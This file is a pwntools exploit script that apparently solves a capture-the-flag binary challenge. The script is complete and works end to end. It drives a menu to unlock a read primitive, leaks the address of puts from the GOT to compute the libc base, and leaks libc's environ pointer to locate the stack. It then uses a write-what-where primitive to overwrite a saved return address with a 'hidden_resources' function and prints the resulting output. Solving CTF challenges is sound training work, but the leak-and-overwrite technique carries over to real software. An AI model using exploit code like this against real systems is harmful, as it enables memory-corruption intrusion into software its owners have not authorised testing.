from pwn import *

elf = ELF("./challenge/environment")
libc = ELF("./challenge/libc.so.6")

conn = remote(MACHINE_IP, MACHINE_PORT)

def prompt_answer(answer):
    conn.recvuntil("> ")
    conn.sendline(answer)

def farm_recycling():
    with log.progress("farming recycling") as progress:
        for i in range(0, 10):
            progress.status("recycling number %d" % i)
            prompt_answer("2")
            prompt_answer("1")
            prompt_answer("n")

def leak_libc_base():
    with log.progress("leak libc base address") as progress:
        progress.status("sending payload")
        conn.recvuntil("> ")
        conn.send(b"0x%x" % elf.got["puts"])
        conn.recv(4)

        progress.status("computing libc base address")
        leak = conn.recvline().strip()
        leak = u64(leak.ljust(8, b"\x00"))
        libc.address = leak - libc.symbols["puts"]

def leak_environ():
    with log.progress("leak environ from libc") as progress:
        progress.status("go to recycling menu")
        prompt_answer("2")
        prompt_answer("1")
        prompt_answer("y")

        progress.status("sending payload")
        conn.recvuntil("> ")
        conn.send(b"0x%x" % libc.symbols["environ"])
        conn.recv(4)

        progress.status("computing environ")
        environ = conn.recvline().strip()
        environ = u64(environ.ljust(8, b"\x00"))
        return environ

def write_what_where(what, where):
    with log.progress("write what where") as progress:
        progress.status("go to plant menu")
        prompt_answer("1")

        progress.status("sending the where")
        conn.recvuntil("> ")
        conn.send(b"0x%x" % where)

        progress.status("sending the what")
        conn.recvuntil("> ")
        conn.send(b"0x%x" % what)

farm_recycling()
leak_libc_base()
environ = leak_environ()
return_address_in_stack = environ - 0x8 * 36
write_what_where(elf.symbols["hidden_resources"], return_address_in_stack)
conn.recvlines(2)

log.success(conn.recvlineS())
